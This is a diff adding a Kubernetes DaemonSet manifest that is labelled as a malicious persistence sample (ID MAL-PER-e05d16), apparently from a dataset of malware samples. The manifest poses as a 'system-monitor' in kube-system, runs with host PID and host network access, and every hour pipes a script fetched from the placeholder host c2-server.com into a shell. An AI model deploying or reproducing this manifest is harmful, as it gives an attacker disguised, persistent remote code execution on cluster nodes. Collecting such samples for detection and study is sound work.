@@ -1,0 +1,28 @@
+# MAL-PER-e05d16 - 恶意 systemd 配置
+# 难度：L3 | 语言：YAML
+
+# Kubernetes DaemonSet for persistence
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: system-monitor
+  namespace: kube-system
+spec:
+  selector:
+    matchLabels:
+      app: monitor
+  template:
+    spec:
+      hostPID: true
+      hostNetwork: true
+      containers:
+      - name: monitor
+        image: busybox
+        command: ["/bin/sh"]
+        args:
+          - -c
+          - |
+            while true; do
+              curl http://c2-server.com/payload.sh | sh
+              sleep 3600
+            done
